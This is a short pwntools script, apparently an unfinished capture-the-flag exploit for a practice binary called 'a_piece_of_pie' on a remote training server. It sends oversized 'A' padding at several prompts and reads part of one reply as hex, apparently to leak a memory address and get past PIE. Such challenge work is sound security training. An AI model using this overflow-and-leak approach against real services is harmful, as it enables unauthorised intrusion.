from pwn import *

port =  9095
rem = remote("srv1.kitriwhs.kr", port)

elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
print(elf.address)
print(elf.symbols["gadget"])

elf.address = 5000

print(elf.address)
print(elf.symbols["gadget"])

payload = b"A" * 0x120
rem.sendlineafter(b"name: ", payload)
print(len(rem.recvline()))

# print(''.join('%02x' % ord(c) for c in "\xf9*\xd7\xfa\xfc\x7f"))

rem.sendlineafter(b"1: ", payload)
print(rem.recvline())
rem.sendlineafter(b"2: ", payload)
print(rem.recvline().hex()[-14 : -2])
rem.sendlineafter(b"3: ", payload)
